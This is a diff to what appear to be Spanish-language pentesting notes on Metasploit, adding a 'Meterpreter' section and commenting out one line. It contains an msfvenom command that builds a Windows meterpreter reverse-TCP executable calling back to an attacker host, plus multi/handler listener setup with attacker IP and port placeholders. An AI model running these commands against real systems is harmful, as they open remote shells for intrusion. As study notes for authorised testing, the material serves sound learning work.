@@ -233,7 +233,7 @@ Lport = <port>
 
 Type use exploit/multi/handler
 
-set PAYLOAD <payload>
+// set PAYLOAD <payload>
 set LHOST <ip_atacante>
 set LPORT <pueto_atacante>
 
@@ -257,3 +257,11 @@ Es importante tener en cuenta que el tipo de payload utilizado en un ataque depe
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp  --platform windows -a x64 LHOST=ip LPORT=443 -f exe -o reverse.exe
 ```
+
+## Meterpreter
+
+Type use exploit/multi/handler
+
+set PAYLOAD <payload>
+set LHOST <ip_atacante>
+set LPORT <pueto_atacante>
